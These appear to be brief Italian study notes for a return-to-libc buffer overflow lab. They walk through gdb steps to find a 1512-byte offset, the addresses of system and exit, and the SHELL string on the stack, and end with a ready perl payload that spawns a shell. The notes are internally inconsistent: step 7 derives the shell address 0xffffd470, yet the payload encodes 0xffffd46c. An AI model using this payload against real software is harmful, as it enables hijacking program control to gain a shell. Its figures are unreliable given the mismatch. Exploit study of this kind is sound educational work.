BUFFER OVERFLOW CON RETURNTOLIBC

Per lo shellcode codice per N basta mettere quel valore che mi stampa il p programma

1) rendo eseguibile il programma
2) apro gdb e runno il programma
3) ho trovato che il numero per sovrascrivere l'indirizzo di ritorno Ã¨ 1512
4) metto un breakpoint al main
5) 0xf7c4c7b0 -> risultato di p system -> termina con uno 0 quindi faccio disas system e prendo quello che ha +5 byte e dovrebbe funzionare -> 0xf7c4c7b5
6) 0xf7c3bc40 -> risultato di p exit
7) ora devo trovare la variabile d'ambiente SHELL e devo cercarla nello stack -> x/500 $esp e cerco finche non trovo:
    0xffffd46a -> "SHELL=/usr/bin/zsh" -> a noi non interessa la prima parte "SHELL=" in quanto per lanciare la shell basta il percorso, quindi dobbiamo eliminare i primi 6 byte (aumento di 6 l'indirizzo)-> l'indirizzo di shell ora diventa: 0xffffd470
8) payload finale: run $(perl -e 'print "A"x1512,"\xb5\xc7\xc4\xf7", "\x40\xbc\xc3\xf7", "\x6c\xd4\xff\xff"')



